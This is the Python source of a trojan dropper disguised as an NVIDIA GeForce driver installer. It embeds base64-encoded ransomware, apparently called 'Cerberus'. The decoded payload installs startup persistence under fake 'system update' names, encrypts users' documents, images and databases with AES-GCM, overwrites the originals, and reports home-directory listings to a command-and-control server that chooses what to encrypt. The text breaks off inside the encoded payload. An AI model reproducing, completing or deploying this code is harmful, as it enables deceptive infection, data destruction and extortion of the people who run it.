import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
import ctypes
from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame

# --- CONFIGURATION ---
FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
RANSOMWARE_B64 = "IyByYW5zb213YXJlLnB5CmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGpzb24KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCBzaHV0aWwKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGN0eXBlcwoKIyBERUJVRzogQ3Jhc2ggTG9nZ2luZyBmb3IgSW1wb3J0cwp0cnk6CiAgICBmcm9tIHRraW50ZXIgaW1wb3J0IFRrLCBMYWJlbCwgRW50cnksIEJ1dHRvbiwgU3RyaW5nVmFyLCBGcmFtZSwgUGhvdG9JbWFnZSwgbWVzc2FnZWJveAogICAgZnJvbSB0a2ludGVyIGltcG9ydCBmb250IGFzIHRrZm9udAogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMua2RmLnBia2RmMiBpbXBvcnQgUEJLREYySE1BQwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmQKICAgIGltcG9ydCByZXF1ZXN0cwogICAgZnJvbSBweW5wdXQgaW1wb3J0IGtleWJvYXJkCmV4Y2VwdCBJbXBvcnRFcnJvciBhcyBlOgogICAgdHJ5OgogICAgICAgIGRlYnVnX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJSQU5TT01XQVJFX0lNUE9SVF9FUlJPUi50eHQiKQogICAgICAgIHdpdGggb3BlbihkZWJ1Z19wYXRoLCAidyIpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZiJGYWlsZWQgdG8gaW1wb3J0IG1vZHVsZXM6IHtlfSIpCiAgICBleGNlcHQ6IHBhc3MKICAgIHN5cy5leGl0KDEpCgojIC0tLSBDb25maWd1cmF0aW9uIC0tLQojIFBBU1RFIFRIRSBQVUJMSUMgS0VZIEZST00gVEhFIEMyIFNFUlZFUidTIENPTlNPTEUgT1VUUFVUIEhFUkUKQVRUQUNLRVJfUFVCTElDX0tFWSA9ICIiIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tCk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeTI1YUVvQU11UVNaZi9OVWRDMVUKWk5ZVFhhTDBUODZSOTNWM01ORVlyK0liNUlidFdKZ2J4SWZ5MlJyckdsb2QwaCs1ZHh6NjlGZGZvVy9UQUZPMwpsblc2QXA4em5RREplOTdxbE01ZHJpY2wxNGtVYnFQd2M4c2s2QkFRb1Q5ZmFKU0ZhZ1JxU3NhR245WXZuenVXCm8wcTdvL0QraWxuR2M5WFdoSGdaRGwvdkVTR1pFWmVKRDFnZzM1MWlYcHBySjdBUmlmdUFWbyt4YWlnRXNtWU4KcEo1cWlKNXk5ZUVITEt3dUI2RmtwUi81Y3Q3VytHN1kxSGpFemtMbzhHK29RQjR6RmxyQUlOWlB2SG9RNHVKQQpFZnJVdkkvUHoyS2syUUN6RFhHWVpOY3NBYnlsMkVsbW1TcXBxejBzZjZkVks1Ty85bWw4bEZWbittK1E5SFQrCkR3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQoiIiIKCkMyX1NFUlZFUl9VUkwgPSAiaHR0cDovLzEwLjAuMC4yMTI6NTAwMCIgIyBDaGFuZ2UgaWYgeW91ciBDMiBpcyBob3N0ZWQgZWxzZXdoZXJlCgojIC0tLSBQQVRIIENPTkZJR1VSQVRJT04gLS0tCmRlZiBnZXRfcGF0aHMoKToKICAgICIiIkRldGVybWluZXMgc3RhYmxlIHBhdGhzIGZvciBjb25maWcgYW5kIHRhcmdldCBkYXRhLiIiIgogICAgaG9tZSA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCiAgICAKICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICBjb25maWdfZGlyID0gb3MucGF0aC5qb2luKG9zLmVudmlyb24uZ2V0KCdBUFBEQVRBJywgaG9tZSksICJDZXJiZXJ1cyIpCiAgICBlbHNlOgogICAgICAgIGNvbmZpZ19kaXIgPSBvcy5wYXRoLmpvaW4oaG9tZSwgIi5jb25maWciLCAiY2VyYmVydXMiKQogICAgICAgIAogICAgIyBFTkNSWVBUIE9OTFkgJ3Rlc3RfZGF0YScgSU4gSE9NRSBESVJFQ1RPUlkKICAgIHRhcmdldF9kaXIgPSBvcy5wYXRoLmpvaW4oaG9tZSwgInRlc3RfZGF0YSIpCiAgICAKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhjb25maWdfZGlyKToKICAgICAgICB0cnk6IG9zLm1ha2VkaXJzKGNvbmZpZ19kaXIpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgCiAgICByZXR1cm4gY29uZmlnX2RpciwgdGFyZ2V0X2RpcgoKQ09ORklHX0RJUiwgVEFSR0VUX0RJUkVDVE9SWSA9IGdldF9wYXRocygpCgojIFBlcnNpc3RlbmNlIEZpbGVzIChTdG9yZWQgaW4gSElEREVOIENvbmZpZyBEaXIpCkxPQ0tfRklMRSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiLmNlcmJlcnVzX2xvY2siKQpJRF9GSUxFID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICJjZXJiZXJ1c19pZC50eHQiKSAKS0VZX0JBQ0tVUF9GSUxFID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICJjZXJiZXJ1c19rZXkuYmFrIikKTE9HX0ZJTEUgPSBvcy5wYXRoLmpvaW4oQ09ORklHX0RJUiwgImNlcmJlcnVzX2xvZy50eHQiKQpFTkNSWVBURURfUEFUSFNfRklMRSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiZW5jcnlwdGVkX3BhdGhzLmpzb24iKSAgIyBUcmFjayB3aGljaCBkaXJzIHdlcmUgZW5jcnlwdGVkCgojIENsZWFudXAgTWFya2VyIChDYW4gc3RheSBpbiBjb25maWcgZGlyIG9yIGJlIGdsb2JhbCkKQ0xFQU5fTUFSS0VSID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICIuY2VyYmVydXNfZnJlZWQiKQoKRU5DUllQVEVEX0VYVEVOU0lPTiA9ICIuY2VyYmVydXMiCgojIC0tLSBGaWxlIFR5cGUgVGFyZ2V0aW5nIC0tLQpUQVJHRVRfRVhURU5TSU9OUyA9IHsKICAgICcudHh0JywgJy5kb2MnLCAnLmRvY3gnLCAnLnhscycsICcueGxzeCcsICcucHB0JywgJy5wcHR4JywgJy5wZGYnLAogICAgJy5qcGcnLCAnLmpwZWcnLCAnLnBuZycsICcuZ2lmJywgJy5ibXAnLCAnLnRpZmYnLCAnLnN2ZycsCiAgICAnLm1wMycsICcud2F2JywgJy5tcDQnLCAnLmF2aScsICcubW92JywgJy5ta3YnLCAnLnNxbCcsICcuZGInCn0KCiMgLS0tIEdVSSBBc3NldCAoQmFzZTY0IGVuY29kZWQgMXgxIHJlZCBwaXhlbCBmb3IgbG9nbykgLS0tCkxPR09fQkFTRTY0ID0gIiIiCmlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFCQ0FZQUFBQWZGY1NKQUFBQURVbEVRVlI0Mm1QOC81K2hIZ0FIZ2dKL1BjaEk3d0FBQUFCSlJVNUVya0pnZ2c9PQoiIiIKCiMgLS0tIFBlcnNpc3RlbmNlIFV0aWxpdGllcyAtLS0KZGVmIGluc3RhbGxfcGVyc2lzdGVuY2UoKToKICAgICIiIkluc3RhbGxzIHRoZSByYW5zb213YXJlIHRvIHJ1biBvbiBzdGFydHVwIHVzaW5nIGFic29sdXRlIHBhdGhzLiIiIgogICAgdHJ5OgogICAgICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOgogICAgICAgICAgICBhcHBfcGF0aCA9IHN5cy5leGVjdXRhYmxlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYXBwX3BhdGggPSBvcy5wYXRoLmFic3BhdGgoX19maWxlX18pCiAgICAgICAgICAgIAogICAgICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICAgICAgaW1wb3J0IHdpbnJlZwogICAgICAgICAgICBrZXlfcGF0aCA9IHIiU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBrZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9DVVJSRU5UX1VTRVIsIGtleV9wYXRoLCAwLCB3aW5yZWcuS0VZX1NFVF9WQUxVRSkKICAgICAgICAgICAgICAgIGNtZCA9IGYnInthcHBfcGF0aH0iJwogICAgICAgICAgICAgICAgd2lucmVnLlNldFZhbHVlRXgoa2V5LCAiV2luZG93c1N5c3RlbVVwZGF0ZSIsIDAsIHdpbnJlZy5SRUdfU1osIGNtZCkKICAgICAgICAgICAgICAgIHdpbnJlZy5DbG9zZUtleShrZXkpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIldpbmRvd3MgcGVyc2lzdGVuY2UgZmFpbGVkOiB7ZX0iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGF1dG9zdGFydF9kaXIgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLmNvbmZpZy9hdXRvc3RhcnQiKQogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoYXV0b3N0YXJ0X2Rpcik6CiAgICAgICAgICAgICAgICB0cnk6IG9zLm1ha2VkaXJzKGF1dG9zdGFydF9kaXIpCiAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgIGRlc2t0b3BfZmlsZSA9IG9zLnBhdGguam9pbihhdXRvc3RhcnRfZGlyLCAic3lzdGVtX3VwZGF0ZS5kZXNrdG9wIikKICAgICAgICAgICAgd2l0aCBvcGVuKGRlc2t0b3BfZmlsZSwgInciKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShmIltEZXNrdG9wIEVudHJ5XVxuIikKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJUeXBlPUFwcGxpY2F0aW9uXG4iKQogICAgICAgICAgICAgICAgZi53cml0ZShmIk5hbWU9U3lzdGVtIENyaXRpY2FsIFVwZGF0ZVxuIikKICAgICAgICAgICAgICAgICMgQ29tbWFuZDogcHl0aG9uMyAvcGF0aC90by9yYW5zb213YXJlLnB5CiAgICAgICAgICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICAgICAgICAgICAgICAgY21kID0gZiJ7YXBwX3BhdGh9IgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgY21kID0gZiJ7c3lzLmV4ZWN1dGFibGV9IHthcHBfcGF0aH0iCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiRXhlYz17Y21kfVxuIikKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJUZXJtaW5hbD1mYWxzZVxuIikKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJYLUdOT01FLUF1dG9zdGFydC1lbmFibGVkPXRydWVcbiIpCiAgICAgICAgICAgIAogICAgICAgICAgICB0cnk6IHN1YnByb2Nlc3MucnVuKFsnY2htb2QnLCAnK3gnLCBkZXNrdG9wX2ZpbGVdKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiUGVyc2lzdGVuY2UgaW5zdGFsbGF0aW9uIGZhaWxlZDoge2V9IikKCmRlZiByZW1vdmVfcGVyc2lzdGVuY2UoKToKICAgICIiIlJlbW92ZXMgdGhlIHBlcnNpc3RlbmNlIG1lY2hhbmlzbS4iIiIKICAgIHRyeToKICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgIGltcG9ydCB3aW5yZWcKICAgICAgICAgICAga2V5X3BhdGggPSByIlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAga2V5ID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCBrZXlfcGF0aCwgMCwgd2lucmVnLktFWV9TRVRfVkFMVUUpCiAgICAgICAgICAgICAgICB3aW5yZWcuRGVsZXRlVmFsdWUoa2V5LCAiV2luZG93c1N5c3RlbVVwZGF0ZSIpCiAgICAgICAgICAgICAgICB3aW5yZWcuQ2xvc2VLZXkoa2V5KQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwYXNzIAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhdGhzID0gWwogICAgICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5jb25maWcvYXV0b3N0YXJ0L3N5c3RlbV91cGRhdGUuZGVza3RvcCIpLAogICAgICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5sb2NhbC9zaGFyZS9hcHBsaWNhdGlvbnMvc3lzdGVtX3VwZGF0ZS5kZXNrdG9wIikKICAgICAgICAgICAgXQogICAgICAgICAgICBmb3IgcCBpbiBwYXRoczoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHApOgogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShwKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIlBlcnNpc3RlbmNlIHJlbW92YWwgZmFpbGVkOiB7ZX0iKQoKIyAtLS0gU3lzdGVtIExvY2tkb3duIFV0aWxpdGllcyAtLS0KZGVmIGhpZGVfY29uc29sZSgpOgogICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IGN0eXBlcwogICAgICAgICAgICBrZXJuZWwzMiA9IGN0eXBlcy5XaW5ETEwoJ2tlcm5lbDMyJykKICAgICAgICAgICAgdXNlcjMyID0gY3R5cGVzLldpbkRMTCgndXNlcjMyJykKICAgICAgICAgICAgaFduZCA9IGtlcm5lbDMyLkdldENvbnNvbGVXaW5kb3coKQogICAgICAgICAgICBpZiBoV25kOgogICAgICAgICAgICAgICAgdXNlcjMyLlNob3dXaW5kb3coaFduZCwgMCkgIyBTV19ISURFID0gMAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcGFzcwoKIyAtLS0gQ3J5cHRvZ3JhcGh5IC0tLQpkZWYgZ2VuZXJhdGVfYWVzX2tleSgpOgogICAgcmV0dXJuIG9zLnVyYW5kb20oMzIpCgpkZWYgZW5jcnlwdF9maWxlX2Flc19nY20oZmlsZV9wYXRoLCBrZXkpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGY6CiAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoKQogICAgICAgIG5vbmNlID0gb3MudXJhbmRvbSgxMikKICAgICAgICBjaXBoZXIgPSBDaXBoZXIoYWxnb3JpdGhtcy5BRVMoa2V5KSwgbW9kZXMuR0NNKG5vbmNlKSwgYmFja2VuZD1kZWZhdWx0X2JhY2tlbmQoKSkKICAgICAgICBlbmNyeXB0b3IgPSBjaXBoZXIuZW5jcnlwdG9yKCkKICAgICAgICBlbmNyeXB0ZWRfZGF0YSA9IGVuY3J5cHRvci51cGRhdGUoZGF0YSkgKyBlbmNyeXB0b3IuZmluYWxpemUoKQogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGggKyBFTkNSWVBURURfRVhURU5TSU9OLCAnd2InKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKG5vbmNlICsgZW5jcnlwdG9yLnRhZyArIGVuY3J5cHRlZF9kYXRhKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiRmFpbGVkIHRvIGVuY3J5cHQge2ZpbGVfcGF0aH06IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgZGVjcnlwdF9maWxlX2Flc19nY20oZW5jcnlwdGVkX3BhdGgsIGtleSk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGVuY3J5cHRlZF9wYXRoLCAncmInKSBhcyBmOgogICAgICAgICAgICBub25jZV90YWdfZGF0YSA9IGYucmVhZCgpCiAgICAgICAgbm9uY2UsIHRhZywgZW5jcnlwdGVkX2RhdGEgPSBub25jZV90YWdfZGF0YVs6MTJdLCBub25jZV90YWdfZGF0YVsxMjoyOF0sIG5vbmNlX3RhZ19kYXRhWzI4Ol0KICAgICAgICBjaXBoZXIgPSBDaXBoZXIoYWxnb3JpdGhtcy5BRVMoa2V5KSwgbW9kZXMuR0NNKG5vbmNlLCB0YWcpLCBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpKQogICAgICAgIGRlY3J5cHRvciA9IGNpcGhlci5kZWNyeXB0b3IoKQogICAgICAgIGRlY3J5cHRlZF9kYXRhID0gZGVjcnlwdG9yLnVwZGF0ZShlbmNyeXB0ZWRfZGF0YSkgKyBkZWNyeXB0b3IuZmluYWxpemUoKQogICAgICAgIG9yaWdpbmFsX3BhdGggPSBlbmNyeXB0ZWRfcGF0aC5yZW1vdmVzdWZmaXgoRU5DUllQVEVEX0VYVEVOU0lPTikKICAgICAgICB3aXRoIG9wZW4ob3JpZ2luYWxfcGF0aCwgJ3diJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShkZWNyeXB0ZWRfZGF0YSkKICAgICAgICBvcy5yZW1vdmUoZW5jcnlwdGVkX3BhdGgpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJGYWlsZWQgdG8gZGVjcnlwdCB7ZW5jcnlwdGVkX3BhdGh9OiB7ZX0iKQogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNlY3VyZV9kZWxldGVfZmlsZShmaWxlX3BhdGgsIHBhc3Nlcz0xKTogCiAgICB0cnk6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZmlsZV9wYXRoKToKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgImJhKyIpIGFzIGY6CiAgICAgICAgICAgICAgICBsZW5ndGggPSBmLnRlbGwoKQogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAicitiIikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUob3MudXJhbmRvbShsZW5ndGgpKQogICAgICAgICAgICBvcy5yZW1vdmUoZmlsZV9wYXRoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkZhaWxlZCB0byBzZWN1cmVseSBkZWxldGUge2ZpbGVfcGF0aH06IHtlfSIpCgojIC0tLSBMb2dnaW5nIC0tLQpkZWYgbG9nX2Vycm9yKG1lc3NhZ2UpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihMT0dfRklMRSwgJ2EnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGYie3RpbWUuc3RyZnRpbWUoJyVZLSVtLSVkICVIOiVNOiVTJyl9IC0gRVJST1I6IHttZXNzYWdlfVxuIikKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzIAoKIyAtLS0gVGFyZ2V0IFNlbGVjdGlvbiAtLS0KZGVmIHNjYW5fZGlyZWN0b3JpZXMocm9vdF9wYXRoLCBtYXhfZGVwdGg9MiwgY3VycmVudF9kZXB0aD0wKToKICAgICIiIlJlY3Vyc2l2ZWx5IHNjYW4gZGlyZWN0b3JpZXMgdXAgdG8gbWF4X2RlcHRoIGxldmVscy4iIiIKICAgIGRpcnMgPSBbXQogICAgaWYgY3VycmVudF9kZXB0aCA+PSBtYXhfZGVwdGg6CiAgICAgICAgcmV0dXJuIGRpcnMKICAgIHRyeToKICAgICAgICBmb3IgZW50cnkgaW4gb3Muc2NhbmRpcihyb290X3BhdGgpOgogICAgICAgICAgICBpZiBlbnRyeS5pc19kaXIoKSBhbmQgbm90IGVudHJ5Lm5hbWUuc3RhcnRzd2l0aCgnLicpOgogICAgICAgICAgICAgICAgZGlycy5hcHBlbmQoZW50cnkucGF0aCkKICAgICAgICAgICAgICAgICMgUmVjdXJzaXZlbHkgc2NhbiBzdWJkaXJlY3RvcmllcwogICAgICAgICAgICAgICAgaWYgY3VycmVudF9kZXB0aCA8IG1heF9kZXB0aCAtIDE6CiAgICAgICAgICAgICAgICAgICAgZGlycy5leHRlbmQoc2Nhbl9kaXJlY3RvcmllcyhlbnRyeS5wYXRoLCBtYXhfZGVwdGgsIGN1cnJlbnRfZGVwdGggKyAxKSkKICAgIGV4Y2VwdCAoUGVybWlzc2lvbkVycm9yLCBPU0Vycm9yKToKICAgICAgICBwYXNzICAjIFNraXAgaW5hY2Nlc3NpYmxlIGRpcmVjdG9yaWVzCiAgICByZXR1cm4gZGlycwoKZGVmIHNjYW5fYW5kX3dhaXRfZm9yX2luc3RydWN0aW9ucygpOgogICAgIiIiCiAgICAxLiBTY2FucyBkaXJlY3RvcmllcyBpbiBob21lIChuZXN0ZWQgdXAgdG8gMiBsZXZlbHMpLgogICAgMi4gU2VuZHMgdGhlbSB0byBDMi4KICAgIDMuIFBvbGxzIHVudGlsIEMyIHNlbmRzIGJhY2sgYSB0YXJnZXQgbGlzdC4KICAgIFJldHVybnM6IGxpc3Qgb2YgcGF0aHMgdG8gZW5jcnlwdCwgb3IgTm9uZSBpZiBDMiB1bnJlYWNoYWJsZS4KICAgICIiIgogICAgaG9tZSA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCiAgICAKICAgICMgU2NhbiBuZXN0ZWQgZm9sZGVycyAoMiBsZXZlbHMgZGVlcCkgaW4gaG9tZQogICAgZGlycyA9IHNjYW5fZGlyZWN0b3JpZXMoaG9tZSwgbWF4X2RlcHRoPTIpCiAgICBsb2dfZXJyb3IoZiJTY2FubmVkIHtsZW4oZGlycyl9IGRpcmVjdG9yaWVzICgyIGxldmVscyBkZWVwKSIpCiAgICAKICAgICMgR2VuZXJhdGUgdGVtcCBJRCBmb3IgcmVjb24gcGhhc2UKICAgIHRlbXBfaWQgPSBiYXNlNjQudXJsc2FmZV9iNjRlbmNvZGUob3MudXJhbmRvbSg2KSkuZGVjb2RlKCkucnN0cmlwKCc9JykKICAgIGxvZ19lcnJvcihmIlJlY29uIElEOiB7dGVtcF9pZH0gLSBGb3VuZCB7bGVuKGRpcnMpfSBmb2xkZXJzIikKICAgIAogICAgIyBTZW5kIHRvIEMyCiAgICBwYXlsb2FkID0geyJpZCI6IHRlbXBfaWQsICJ0eXBlIjogIlJFQ09OIiwgImZpbGVzIjogZGlyc30KICAgIHRyeToKICAgICAgICByZXF1ZXN0cy5wb3N0KGYie0MyX1NFUlZFUl9VUkx9L2FwaS9yZWNvbiIsIGpzb249cGF5bG9hZCwgdGltZW91dD01KQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIlJlY29uIHNlbmQgZmFpbGVkOiB7ZX0iKQogICAgICAgIHJldHVybiBOb25lICAjIEZhaWwgdG8gb2ZmbGluZSBtb2RlCiAgICAKICAgICMgUG9sbCBmb3IgY29tbWFuZAogICAgbG9nX2Vycm9yKCJXYWl0aW5nIGZvciBhdHRhY2tlciB0byBzZWxlY3QgdGFyZ2V0cy4uLiIpCiAgICBmb3IgXyBpbiByYW5nZSgxMjApOiAgIyBXYWl0IHVwIHRvIDEwIG1pbnV0ZXMgKDEyMCAqIDVzKQogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcCA9IHJlcXVlc3RzLmdldChmIntDMl9TRVJWRVJfVVJMfS9hcGkvdGFzay97dGVtcF9pZH0iLCB0aW1lb3V0PTUpCiAgICAgICAgICAgIGlmIHJlc3Auc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgZGF0YSA9IHJlc3AuanNvbigpCiAgICAgICAgICAgICAgICBpZiBkYXRhLmdldCgiYWN0aW9uIikgPT0gIkVOQ1JZUFQiOgogICAgICAgICAgICAgICAgICAgIHRhcmdldHMgPSBkYXRhLmdldCgidGFyZ2V0cyIsIFtdKQogICAgICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIlJlY2VpdmVkIEVOQ1JZUFQgY29tbWFuZCBmb3Ige2xlbih0YXJnZXRzKX0gdGFyZ2V0cyIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRhcmdldHMKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICB0aW1lLnNsZWVwKDUpCiAgICAKICAgIGxvZ19lcnJvcigiVGltZWQgb3V0IHdhaXRpbmcgZm9yIGNvbW1hbmQiKQogICAgcmV0dXJuIE5vbmUKCiMgLS0tIFJhbnNvbXdhcmUgTG9naWMgLS0tCmRlZiBlbmNyeXB0X2RpcmVjdG9yeSh0YXJnZXRfbGlzdD1Ob25lKToKICAgICIiIkVuY3J5cHRzIGZpbGVzIGluIHRhcmdldCBkaXJlY3Rvcmllcy4gSWYgdGFyZ2V0X2xpc3QgaXMgTm9uZSwgZmFsbHMgYmFjayB0byBkZWZhdWx0IFRBUkdFVF9ESVJFQ1RPUlkuIiIiCiAgICAKICAgICMgRmFsbGJhY2sgdG8gZGVmYXVsdCBpZiBubyBsaXN0IHByb3ZpZGVkIChvZmZsaW5lIG1vZGUpCiAgICBpZiB0YXJnZXRfbGlzdCBpcyBOb25lIG9yIGxlbih0YXJnZXRfbGlzdCkgPT0gMDoKICAgICAgICB0YXJnZXRfbGlzdCA9IFtUQVJHRVRfRElSRUNUT1JZXQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhUQVJHRVRfRElSRUNUT1JZKToKICAgICAgICAgICAgdHJ5OiBvcy5tYWtlZGlycyhUQVJHRVRfRElSRUNUT1JZKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICAjIFJlc3VtZSBmcm9tIGNyYXNoIGlmIGtleSBiYWNrdXAgZXhpc3RzCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhLRVlfQkFDS1VQX0ZJTEUpOgogICAgICAgIGxvZ19lcnJvcigiRm91bmQga2V5IGJhY2t1cC4gUmVzdW1pbmcgZnJvbSBjcmFzaC4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oS0VZX0JBQ0tVUF9GSUxFLCAncmInKSBhcyBmOgogICAgICAgICAgICAgICAgcmV0dXJuIGYucmVhZCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzIAoKICAgICMgU2tpcCBpZiBhbHJlYWR5IGVuY3J5cHRlZAogICAgaWYgb3MucGF0aC5leGlzdHMoTE9DS19GSUxFKToKICAgICAgICBsb2dfZXJyb3IoIkVuY3J5cHRpb24gc2VlbWluZ2x5IGNvbXBsZXRlIChMb2NrIGZpbGUgZXhpc3RzKS4iKQogICAgICAgIHJldHVybiBOb25lCgogICAgYWVzX2tleSA9IGdlbmVyYXRlX2Flc19rZXkoKQogICAgCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKEtFWV9CQUNLVVBfRklMRSwgJ3diJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShhZXNfa2V5KQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkZhaWxlZCB0byB3cml0ZSBrZXkgYmFja3VwOiB7ZX0iKQoKICAgICMgU2F2ZSB0YXJnZXQgbGlzdCBmb3IgZGVjcnlwdGlvbiBsYXRlcgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihFTkNSWVBURURfUEFUSFNfRklMRSwgJ3cnKSBhcyBmOgogICAgICAgICAgICBqc29uLmR1bXAodGFyZ2V0X2xpc3QsIGYpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiRmFpbGVkIHRvIHNhdmUgZW5jcnlwdGVkIHBhdGhzOiB7ZX0iKQoKICAgIGVuY3J5cHRlZF9maWxlcyA9IDAKICAgIAogICAgIyBJdGVyYXRlIG92ZXIgQUxMIHNlbGVjdGVkIHRhcmdldCBkaXJlY3RvcmllcwogICAgbG9nX2Vycm9yKGYiRW5jcnlwdGluZyB7bGVuKHRhcmdldF9saXN0KX0gZGlyZWN0b3JpZXMuLi4iKQogICAgZm9yIHRhcmdldF9wYXRoIGluIHRhcmdldF9saXN0OgogICAgIC